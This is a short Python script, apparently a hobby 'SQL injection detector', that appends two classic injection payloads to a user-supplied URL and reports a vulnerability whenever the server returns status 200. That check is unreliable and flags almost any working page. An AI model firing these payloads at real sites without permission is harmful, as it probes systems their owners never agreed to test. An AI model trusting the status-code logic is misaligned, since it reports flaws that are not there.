import requests

print('''\033[92m
  ___  ___  _     ___   ___      _          _           
 / __|/ _ \| |   |_ _| |   \ ___| |_ ___ __| |_ ___ _ _ 
 \__ \ (_) | |__  | |  | |) / -_)  _/ -_) _|  _/ _ \ '_|
 |___/\__\_\____||___| |___/\___|\__\___\__|\__\___/_|  
                                                                      
	coded by R3DHULK
	Github Page : https://github.com/R3DHULK
''')

def scan(url):
  # These are common SQL injection payloads
  payloads = ["' OR 1=1; --", "' OR '1'='1"]

  for payload in payloads:
    r = requests.get(url + payload)
    if r.status_code == 200:
      print(f"\033[92m [+] Possible SQL injection vulnerability found at {url}\n")
    else:
      print("\033[91m [-] Vulnerability Not Found\n")
      break

# Test the scanner with a vulnerable URL
scan(input("\033[92m [*] Enter URL: "))

# Test the scanner with a safe URL
# scan("http://safe.com/page?id=1")

input(" [+] Enter To Exit")
